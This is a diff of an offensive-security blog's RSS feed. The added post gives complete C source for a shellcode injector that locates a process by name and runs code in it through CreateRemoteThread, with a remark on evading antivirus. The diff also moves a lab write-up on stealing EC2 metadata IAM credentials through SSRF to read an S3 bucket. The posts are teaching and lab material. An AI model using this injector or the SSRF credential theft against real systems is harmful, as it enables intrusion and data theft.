@@ -1,4 +1,212 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>k0shane</title><description>Offensive Security Stuff</description><link>https://k0shane.github.io/</link><language>en</language><item><title>0x01 - Process Injection Techniques Part I</title><link>https://k0shane.github.io/posts/maldev/0x1-process-injection/</link><guid isPermaLink="true">https://k0shane.github.io/posts/maldev/0x1-process-injection/</guid><pubDate>Tue, 18 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;Intro&lt;/h3&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>k0shane</title><description>Offensive Security Stuff</description><link>https://k0shane.github.io/</link><language>en</language><item><title>0x02 - Process Injection Part II</title><link>https://k0shane.github.io/posts/maldev/0x2-process-injection-2/</link><guid isPermaLink="true">https://k0shane.github.io/posts/maldev/0x2-process-injection-2/</guid><pubDate>Wed, 19 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;From the part I of &lt;code&gt;Process Injection&lt;/code&gt; blog, we used process ID (PID) as a argument to inject our shellcode. But to get &lt;code&gt;PID&lt;/code&gt;, we had to rely on other tool like &lt;code&gt;Process Hacker&lt;/code&gt; to find the &lt;code&gt;PID&lt;/code&gt; of a target program. It had a few extra steps to get the job done. So today, instead of talking about a new technique, we&apos;re going to improve our previous code. This time, we&apos;ll use the process name instead of the process ID.&lt;/p&gt;
+&lt;p&gt;So, instead of manually finding the &lt;code&gt;PID&lt;/code&gt; ourself, we can simply provide the program name like &lt;code&gt;notepad.exe&lt;/code&gt; and let the program find the &lt;code&gt;PID&lt;/code&gt; itself.&lt;/p&gt;
+&lt;p&gt;:::note
+Before we start, you might notice that I&apos;m using wide-character functions like &lt;code&gt;wmain&lt;/code&gt;, &lt;code&gt;Process32FirstW&lt;/code&gt;, &lt;code&gt;wcscmp&lt;/code&gt;, and &lt;code&gt;wprintf&lt;/code&gt;. Windows APIs come in two versions &lt;code&gt;ANSI (char, 8-bit)&lt;/code&gt; and &lt;code&gt;Unicode (wchar_t, 16-bit)&lt;/code&gt;. Both still work, but modern Windows mainly use Unicode internally. So it’s better to use the &lt;code&gt;Unicode (wide-char)&lt;/code&gt; functions because they handle all languages properly and are the recommended standard today.
+:::&lt;/p&gt;
+&lt;h3&gt;FindProcessId Function&lt;/h3&gt;
+&lt;p&gt;Let&apos;s review our new function that find process ID of target program.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;DWORD FindProcessId(const wchar_t* processname)
+{
+    HANDLE hProcessSnap;
+    PROCESSENTRY32W pe32;
+    DWORD result = 0;
+
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hProcessSnap) return 0;
+
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (!Process32FirstW(hProcessSnap, &amp;amp;pe32))
+    {
+        CloseHandle(hProcessSnap);
+        wprintf(L&quot;!!! Failed to gather information on system processes!\n&quot;);
+        return 0;
+    }
+
+    do
+    {
+        if (wcscmp(processname, pe32.szExeFile) == 0)
+        {
+            result = pe32.th32ProcessID;
+            //wprintf(L&quot;Process ID: %lu\n&quot;, result);
+            break;
+        }
+    } while (Process32NextW(hProcessSnap, &amp;amp;pe32));
+
+    CloseHandle(hProcessSnap);
+    return result;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;For this function, I took a reference from this &lt;a href=&quot;https://stackoverflow.com/questions/20874381/get-a-process-id-in-c-by-name&quot;&gt;stackoverflow&lt;/a&gt; post and make a little bit changes for our program.&lt;/p&gt;
+&lt;h3&gt;Taking a Snapshots&lt;/h3&gt;
+&lt;p&gt;We declared the variables first.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HANDLE hProcessSnap;
+PROCESSENTRY32W pe32; // see below about this structure
+DWORD result = 0;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;hProcessSnap&lt;/code&gt; is a HANDLE for &lt;code&gt;CreateToolhelp32Snapshot&lt;/code&gt;. &lt;code&gt;result&lt;/code&gt; will be the return data for PID.&lt;/p&gt;
+&lt;p&gt;First we call &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot&quot;&gt;CreateToolhelp32Snapshot&lt;/a&gt; function for enumerating processes.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HANDLE CreateToolhelp32Snapshot(
+  [in] DWORD dwFlags,
+  [in] DWORD th32ProcessID
+);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This API creates a snapshot of all running processes on the system. And we used &lt;code&gt;TH32CS_SNAPPROCESS&lt;/code&gt; in here which can give us a list of all processes. When enumerating all the processes, the second parameter must be &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev5.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;As per microsoft documentation, to get the first running process, we can use &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first&quot;&gt;Process32First&lt;/a&gt; and for the rest of the processes, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next&quot;&gt;Process32Next&lt;/a&gt; will be required.&lt;/p&gt;
+&lt;p&gt;So to use &lt;code&gt;Process32First&lt;/code&gt; and &lt;code&gt;Process32Next&lt;/code&gt;, we will need one structure which is called &lt;code&gt;PROCESSENTRY32W&lt;/code&gt;,&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev6.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In case if you&apos;re not familiar with structure, structure is a user defined data type that allows us to group variables of different data types under a single name. As you see above image, It&apos;s like a folder, windows fills it with these informations.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Process ID&lt;/li&gt;
+&lt;li&gt;Parent process ID&lt;/li&gt;
+&lt;li&gt;Number of threads&lt;/li&gt;
+&lt;li&gt;Executable filename&lt;/li&gt;
+&lt;li&gt;etc..&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;That&apos;s why we initialized &lt;code&gt;PROCESSENTRY32W pe32;&lt;/code&gt; in this first place. And it is also recommend to check the size of the structure &lt;code&gt;pe32.dwSize = sizeof(PROCESSENTRY32W);&lt;/code&gt;. Because if we didn&apos;t, API call would fail if the structure changes in a future Windows update. We can access the struct data using dot (.) like &lt;code&gt;pe32.th32ProcessID&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Then &lt;code&gt;Process32FirstW&lt;/code&gt; try to get the first process&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if (!Process32FirstW(hProcessSnap, &amp;amp;pe32))
+    {
+        CloseHandle(hProcessSnap);
+        wprintf(L&quot;!!! Failed to gather information on system processes!\n&quot;);
+        return 0;
+    }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Once &lt;code&gt;Process32FirstW&lt;/code&gt; succeeds, we can iterate through the remaining processes in the snapshot with &lt;code&gt;Process32NextW&lt;/code&gt; using do while loop.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;do
+    {
+        // comparing process name with our target, pe32.szExeFile is the process name from struct
+        if (wcscmp(processname, pe32.szExeFile) == 0)
+        {
+            // if found, target process ID will be saved in result
+            result = pe32.th32ProcessID;
+            break;
+        }
+    } while (Process32NextW(hProcessSnap, &amp;amp;pe32)); // loop through until it&apos;s done
+
+    CloseHandle(hProcessSnap); // And close the handle
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Full Source Code&lt;/h3&gt;
+&lt;p&gt;So our full code will be as shown below&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;TlHelp32.h&amp;gt;
+
+// msfvenom -p windows/x64/exec CMD=calc.exe -f c
+unsigned char pShellcode[] = {
+  0xFC, 0x48, 0x83, 0xE4, 0xF0 // REPLACE YOUR SHELLCODE HERE
+  
+};
+
+DWORD FindProcessId(const wchar_t* processname)
+{
+    HANDLE hProcessSnap;
+    PROCESSENTRY32W pe32;
+    DWORD result = 0;
+
+    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hProcessSnap) return 0;
+
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (!Process32FirstW(hProcessSnap, &amp;amp;pe32))
+    {
+        CloseHandle(hProcessSnap);
+        wprintf(L&quot;!!! Failed to gather information on system processes!\n&quot;);
+        return 0;
+    }
+
+    do
+    {
+        if (wcscmp(processname, pe32.szExeFile) == 0)
+        {
+            result = pe32.th32ProcessID;
+            //wprintf(L&quot;Process ID: %lu\n&quot;, result);
+            break;
+        }
+    } while (Process32NextW(hProcessSnap, &amp;amp;pe32));
+
+    CloseHandle(hProcessSnap);
+    return result;
+}
+
+// we create a function called InjectRemoteProcess
+BOOL InjectRemoteProcess(DWORD Pid, PBYTE pShellcode, SIZE_T pShellcodeSize) {
+    // open process to specify Pid
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);
+    if (hProcess == NULL) {
+        printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    printf(&quot;[i] OpenProcess to PID: %i \n&quot;, Pid);
+
+    // allocating memory into a specific process id that you supply
+    PVOID pShellcodeAddress = VirtualAllocEx(hProcess, NULL, pShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (pShellcodeAddress == NULL) {
+        printf(&quot;[!] VirtualAllocEx Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);
+
+    // write our shellcode into allocated memory
+    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, pShellcodeSize, NULL)) {
+        printf(&quot;[!] WriteProcessMemory Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    printf(&quot;[i] Write shellcode to 0x%p\n&quot;, pShellcodeAddress);
+
+    // change to PAGE_EXECUTE_READWRITE
+    DWORD dwOldProtection = NULL;
+    if (!VirtualProtectEx(hProcess, pShellcodeAddress, pShellcodeSize, PAGE_EXECUTE_READWRITE, &amp;amp;dwOldProtection)) {
+        printf(&quot;[!] VirtualProtectEx Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+
+    // create new thread into remote process
+    printf(&quot;[i] Create remote thread to execute payload\n&quot;);
+    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, pShellcodeAddress, NULL, 0, NULL);
+    if (hRemoteThread == NULL) {
+        printf(&quot;[!] CreateRemoteThread Failed With Error : %d \n&quot;, GetLastError());
+        return FALSE;
+    }
+    printf(&quot;[i] Done\n&quot;);
+
+    CloseHandle(hProcess);
+    CloseHandle(hRemoteThread);
+    return TRUE;
+}
+
+int wmain(int argc, wchar_t* argv[])
+{
+    if (argc != 2) {
+        wprintf(L&quot;Usage: %s &amp;lt;process_name.exe&amp;gt;\n&quot;, argv[0]);
+        return 1;
+    }
+
+    const wchar_t* pName = argv[1];
+
+    DWORD dwProcessID = FindProcessId(pName);
+    if (dwProcessID == 0) {
+        wprintf(L&quot;[!] Process %ls not found.\n&quot;, pName);
+        return 1;
+    }
+
+    wprintf(L&quot;\n[!] Process ID of %ls: %lu\n&quot;, pName, dwProcessID);
+
+    SIZE_T pShellcodeSize = sizeof(pShellcode);
+    // calling the function
+    if (!(InjectRemoteProcess(dwProcessID, pShellcode, pShellcodeSize))) {
+        return -1;
+    }
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Running the program&lt;/h3&gt;
+&lt;p&gt;Let&apos;s just run the program with our target name.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/maldev/maldev4.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>0x01 - Process Injection Part I</title><link>https://k0shane.github.io/posts/maldev/0x1-process-injection/</link><guid isPermaLink="true">https://k0shane.github.io/posts/maldev/0x1-process-injection/</guid><pubDate>Tue, 18 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;Intro&lt;/h3&gt;
 &lt;p&gt;So after writing local shellcode injection, now let&apos;s inject our shellcode into remote process which is also called process injection. We can inject our shellcode into other process such as &lt;code&gt;notepad.exe&lt;/code&gt;, &lt;code&gt;explorer.exe&lt;/code&gt;, etc...&lt;/p&gt;
 &lt;p&gt;To inject shellcode into other process, we&apos;re gonna need these WinAPI.&lt;/p&gt;
 &lt;ul&gt;
@@ -8,6 +216,7 @@
 &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex&quot;&gt;VirtualProtectEx&lt;/a&gt; - To change memory region to be executable&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread&quot;&gt;CreateRemoteThread&lt;/a&gt; - Similar to &lt;code&gt;CreateThread&lt;/code&gt; but for remote thread.&lt;/li&gt;
 &lt;/ul&gt;
+&lt;h3&gt;Source Code&lt;/h3&gt;
 &lt;p&gt;Let review the source code first to get better vision.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;#include &amp;lt;Windows.h&amp;gt;
 #include &amp;lt;stdio.h&amp;gt;
@@ -102,7 +311,7 @@ int main(int argc, char* argv[]) {
 	return 0;
 }
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3&gt;OpenProcess&lt;/h3&gt;
+&lt;h3&gt;Opening a Process&lt;/h3&gt;
 &lt;p&gt;You might familar writing Window API from the first post. First we created a function called &lt;code&gt;InjectRemoteProcess&lt;/code&gt;. Function parameters will be processID, shellcode and shellcode size.&lt;/p&gt;
 &lt;p&gt;The first API will be &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess&quot;&gt;OpenProcess&lt;/a&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;HANDLE OpenProcess(
@@ -122,7 +331,7 @@ if (hProcess == NULL) {
 }
 printf(&quot;[i] OpenProcess to PID: %i \n&quot;, Pid);
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3&gt;VirtualAllocEx&lt;/h3&gt;
+&lt;h3&gt;Allocating Memory&lt;/h3&gt;
 &lt;p&gt;As I said above, this is similar to &lt;code&gt;VirtualAlloc&lt;/code&gt; from the first post, &lt;code&gt;VirtualAllocEx&lt;/code&gt; is for allocating memory from a remote process. We just used &lt;code&gt;PAGE_READWRITE&lt;/code&gt; in here for a moment to avoid high entropy of AV/EDR. We will change this &lt;code&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt; later using &lt;code&gt;VirtualProtectEx&lt;/code&gt; API. Now our code will be look like this:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;PVOID pShellcodeAddress = VirtualAllocEx(hProcess, NULL, pShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 if (pShellcodeAddress == NULL) {
@@ -131,6 +340,7 @@ if (pShellcodeAddress == NULL) {
 }
 printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);
 &lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Writing Shellcode to Allocated Memory&lt;/h3&gt;
 &lt;p&gt;Another new API is &lt;code&gt;WriteProcessMemory&lt;/code&gt; which for writing our shellcode into allocated memory to a remote process.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;BOOL WriteProcessMemory(
   [in]  HANDLE  hProcess,
@@ -177,6 +387,7 @@ CloseHandle(hRemoteThread);
   return 0;
 }
 &lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Running the program&lt;/h3&gt;
 &lt;p&gt;Now compile the code in visual studio, open a &lt;code&gt;notepad.exe&lt;/code&gt;, find its process ID using &lt;code&gt;Process Hacker&lt;/code&gt; tool and run it.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/images/maldev/maldev3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 </content:encoded></item><item><title>0x00 - Simple Shellcode Loader with C</title><link>https://k0shane.github.io/posts/maldev/0x0-basic-shellcode-injection/</link><guid isPermaLink="true">https://k0shane.github.io/posts/maldev/0x0-basic-shellcode-injection/</guid><pubDate>Sat, 15 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;In this module, we&apos;re gonna write a simple shellcode loader also known as local shellcode injection using C and Win32 API. If I get enough free time, I&apos;ll continue this as a malware development series. So let&apos;s start with a basic one.&lt;/p&gt;
@@ -372,7 +583,107 @@ VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;So let&apos;s just run our code in visual studio and you can see it will pop up &lt;code&gt;calc.exe&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/images/maldev/maldev1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-</content:encoded></item><item><title>Win x86 Stack Based Buffer Overflow</title><link>https://k0shane.github.io/posts/win32-exp/stack-base-buffer-overflow/</link><guid isPermaLink="true">https://k0shane.github.io/posts/win32-exp/stack-base-buffer-overflow/</guid><pubDate>Wed, 29 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I won&apos;t talk about details in here like how the stack work or what are registers. You must have first knowledge in basic assembly language and debugger because I intended this blog for practical purpose, so I don&apos;t wanna make you bored for reading this kind of stuff. If you don&apos;t know yet how the stack work, there are plenty of good resources out there.I recommend to read it first. So Let&apos;s cut to the chase.&lt;/p&gt;
+</content:encoded></item><item><title>SSRF to S3 Bucket Compromised</title><link>https://k0shane.github.io/posts/cloud-security/ssrf-to-s3-bucket-compromised/</link><guid isPermaLink="true">https://k0shane.github.io/posts/cloud-security/ssrf-to-s3-bucket-compromised/</guid><pubDate>Wed, 29 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;Description&lt;/h3&gt;
+&lt;p&gt;This challenge from &lt;a href=&quot;https://pwnedlabs.io/labs/ssrf-to-pwned&quot;&gt;pwnedlab&lt;/a&gt; is easy and beginner friendly called SSRF to Pwned.&lt;/p&gt;
+&lt;p&gt;The starting point is a single url : http://app.huge-logistics.com&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Think of S3 bucket like a folder in the cloud. We can use it to store any kind of file or data, from documents to images. It can also use to store static file for our websites. Sometimes developers are store sensitive files in s3 bucket. So it&apos;s worth to enumerate s3 bucket during cloud pentest beacuse S3 buckets are often misconfigured.&lt;/p&gt;
+&lt;h3&gt;Enumeration&lt;/h3&gt;
+&lt;p&gt;When we checked the website’s source code, we can see that the webpage stores its image files in an S3 bucket.
+&lt;img src=&quot;/images/aws/ssrf2.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;huge-logistics-storage&lt;/code&gt; is the name of the bucket. When we look at the S3 bucket, we can see a couple of authentication configurations. &lt;code&gt;AuthenticatedUsers&lt;/code&gt; and &lt;code&gt;Unauthenticated(anonymous)&lt;/code&gt;. For &lt;code&gt;AuthenticatedUsers&lt;/code&gt;, access can be granted for specific IAM users/roles or to all AWS accounts.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;AuthenticatedUsers Access&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&amp;lt;b&amp;gt; For specific IAM access&amp;lt;/b&amp;gt; which mean permissions that are granted only to particular IAM users/roles&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&amp;lt;b&amp;gt;For any valid AWS users&amp;lt;/b&amp;gt; If a bucket policy or ACL grants permissions to this group, it means any AWS account with valid credentials can access.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Unauthenticated (Anonymous) Access&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;&amp;lt;b&amp;gt;Anyone on the internet&amp;lt;/b&amp;gt; can list or get the objects.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;AWS CLI&lt;/h3&gt;
+&lt;p&gt;We can check the by command line below&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# admin_cloud6 is just my own aws account
+aws s3 ls s3://huge-logistics-storage --profile admin_cloud6
+
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:iam::427648302155:user/it-admin is not authorized to perform: s3:ListBucket on resource: &quot;arn:aws:s3:::huge-logistics-storage&quot; because no identity-based policy allows the s3:ListBucket action
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;For the unauthenticated request, we can use &lt;code&gt;--no-sign-request&lt;/code&gt; argument.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;aws s3 ls s3://huge-logistics-storage --recursive --no-sign-request                       
+2023-06-01 05:14:05          0 backup/
+2023-06-01 05:14:47       3717 backup/cc-export2.txt
+2023-06-01 21:38:27         32 backup/flag.txt
+2023-06-01 03:40:47          0 web/
+2023-06-01 03:42:33     114886 web/images/about.jpg
+2023-06-01 03:42:34     271657 web/images/banner.jpg
+2023-06-01 03:42:35      48441 web/images/blog1.jpg
+2023-06-01 03:42:36      32805 web/images/blog2.jpg
+2023-06-01 03:42:36      44570 web/images/blog3.jpg
+2023-06-01 03:42:37      20032 web/images/executive.jpg
+2023-06-01 03:42:37      13368 web/images/manager.jpg
+2023-06-01 03:42:38      18260 web/images/manager1.jpg
+2023-06-01 03:42:38      42216 web/images/signature.jpg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There is &lt;code&gt;flag.txt&lt;/code&gt; file in backup folder. We can download it &lt;code&gt;cp&lt;/code&gt; command as follow:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;aws s3 cp s3://huge-logistics-storage/backup/flag.txt . --no-sign-request
+fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It give an error because we don&apos;t have enough access to download it. If we go back to the webpage, there is an endpoint called &lt;code&gt;status.php&lt;/code&gt; as follow:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;http://app.huge-logistics.com/status/status.php?name=hugelogisticsstatus.com&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Which check the status of the website.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf3.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3&gt;Getting AWS Secret&lt;/h3&gt;
+&lt;p&gt;We can check this &lt;code&gt;SSRF&lt;/code&gt; via burp collaborator or localhost &lt;code&gt;127.0.0.1&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf4.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Or we can check &lt;code&gt;metadata&lt;/code&gt; of ec2 instance on this endpoint : &lt;code&gt;169.254.169.254/latest/meta-data/&lt;/code&gt;
+&lt;img src=&quot;/images/aws/ssrf5.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;To grab the aws id and secret key, we need to check first is there any IAM role configured or not from this endpoint &lt;code&gt;169.254.169.254/latest/meta-data/iam/info&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf6.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now we can make a request to fetch &lt;code&gt;MetapwnedS3Access&lt;/code&gt;&apos;s secret with this url: &lt;code&gt;169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf7.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;By using this aws secret, we can configure aws credential to interact with &lt;code&gt;awscli&lt;/code&gt; as shown below&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf8.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;And then we can validate with this command. This is similar to &lt;code&gt;whoami&lt;/code&gt; command in linux.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;aws sts get-caller-identity --profile metapwned
+{
+    &quot;UserId&quot;: &quot;AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1&quot;,
+    &quot;Account&quot;: &quot;104506445608&quot;,
+    &quot;Arn&quot;: &quot;arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1&quot;
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!TIP]
+If you don&apos;t want to add &lt;code&gt;--profile&lt;/code&gt; argument every time you run a command, you can set it as a defult profile like this&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;export AWS_PROFILE=metapwned
+aws sts get-caller-identity                    
+{
+    &quot;UserId&quot;: &quot;AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1&quot;,
+    &quot;Account&quot;: &quot;104506445608&quot;,
+    &quot;Arn&quot;: &quot;arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1&quot;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Compromised S3 Bucket Access&lt;/h3&gt;
+&lt;p&gt;Now that we have IAM role access, let’s try downloading the &lt;code&gt;flag.txt&lt;/code&gt; file again using this profile.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;aws s3 cp s3://huge-logistics-storage/backup/flag.txt .
+download: s3://huge-logistics-storage/backup/flag.txt to ./flag.txt
+
+cat flag.txt 
+282f08a114b4b4f2d345100dXXXXXXXX         
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This time we were able to download successfully the flag file from the compromised S3 bucket.&lt;/p&gt;
+</content:encoded></item><item><title>Win x86 Stack Based Buffer Overflow</title><link>https://k0shane.github.io/posts/win32-exp/stack-base-buffer-overflow/</link><guid isPermaLink="true">https://k0shane.github.io/posts/win32-exp/stack-base-buffer-overflow/</guid><pubDate>Mon, 07 Oct 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I won&apos;t talk about details in here like how the stack work or what are registers. You must have first knowledge in basic assembly language and debugger because I intended this blog for practical purpose, so I don&apos;t wanna make you bored for reading this kind of stuff. If you don&apos;t know yet how the stack work, there are plenty of good resources out there.I recommend to read it first. So Let&apos;s cut to the chase.&lt;/p&gt;
 &lt;h3&gt;What is buffer overflow?&lt;/h3&gt;
 &lt;p&gt;Buffer Overflow may happen when a program writes more data to a buffer (user inputs) beyond it can hold.
 This will lead to memory corruption which mean our buffer can overwrite some important datas of the program in memory. With this vulnerability, attacker can make the program do things it wasn&apos;t supported to do, like running malicious code. This kind of vulnerabilities may happen in programming languages like C and C++ due to their low-level memory management and lack protection. For other languages like Java has automatic memory management through the Garbage Collector. It takes care of allocating and freeing memory, reducing the risk of buffer overflows.&lt;/p&gt;
@@ -584,106 +895,6 @@ exploit()
 &lt;p&gt;Without a NOP sled, you would have to pinpoint the exact starting address of the shellcode, which is hard and unreliable for our exploit.&lt;/p&gt;
 &lt;p&gt;If we run this, it will pop up calculator. That&apos;s it. You can test with your own meterpreter shellcode.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/images/expdev/stack16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-</content:encoded></item><item><title>SSRF to S3 Bucket Compromised</title><link>https://k0shane.github.io/posts/cloud-security/ssrf-to-s3-bucket-compromised/</link><guid isPermaLink="true">https://k0shane.github.io/posts/cloud-security/ssrf-to-s3-bucket-compromised/</guid><pubDate>Wed, 29 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;Description&lt;/h3&gt;
-&lt;p&gt;This challenge from &lt;a href=&quot;https://pwnedlabs.io/labs/ssrf-to-pwned&quot;&gt;pwnedlab&lt;/a&gt; is easy and beginner friendly called SSRF to Pwned.&lt;/p&gt;
-&lt;p&gt;The starting point is a single url : http://app.huge-logistics.com&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/images/aws/ssrf1.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;p&gt;Think of S3 bucket like a folder in the cloud. We can use it to store any kind of file or data, from documents to images. It can also use to store static file for our websites. Sometimes developers are store sensitive files in s3 bucket. So it&apos;s worth to enumerate s3 bucket during cloud pentest beacuse S3 buckets are often misconfigured.&lt;/p&gt;
-&lt;h3&gt;Enumeration&lt;/h3&gt;
-&lt;p&gt;When we checked the website’s source code, we can see that the webpage stores its image files in an S3 bucket.
-&lt;img src=&quot;/images/aws/ssrf2.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
